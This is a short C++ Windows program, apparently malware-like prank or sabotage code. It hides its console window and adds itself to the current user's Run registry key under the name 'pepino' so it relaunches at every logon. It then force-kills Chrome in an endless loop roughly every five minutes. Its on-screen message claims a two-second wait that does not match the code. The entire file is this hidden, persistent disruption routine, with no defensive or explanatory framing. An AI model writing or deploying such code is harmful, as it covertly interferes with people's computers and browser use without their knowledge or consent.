#include <iostream>
#include <windows.h>
#include <chrono>
#include <thread>
#include <String>

int main() {
	HKEY hKey;
	LPCWSTR subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LONG result = RegOpenKeyExW(HKEY_CURRENT_USER,subKey,0,KEY_SET_VALUE,&hKey);
	HWND consola = GetConsoleWindow();
	wchar_t path[MAX_PATH];
	const wchar_t* valor = L"pepino";
	GetModuleFileNameW(NULL, path, MAX_PATH);
	std::wstring quotedPath = L"\"" + std::wstring(path)+L"\"";
	if (consola) {
		ShowWindow(consola,SW_HIDE);
	}
	while (true) {
		if (result == ERROR_SUCCESS) {
			result = RegSetValueExW(hKey, valor, 0, REG_SZ, 
				reinterpret_cast<const BYTE*>(quotedPath.c_str()),
				(quotedPath.size() + 1)*sizeof(wchar_t));
		}
		system("taskkill /im chrome.exe /f");
		std::cout << "Esperando 2 segundos..." << std::endl;
		std::this_thread::sleep_for(std::chrono::seconds(5*60));
	}
	return 0;
}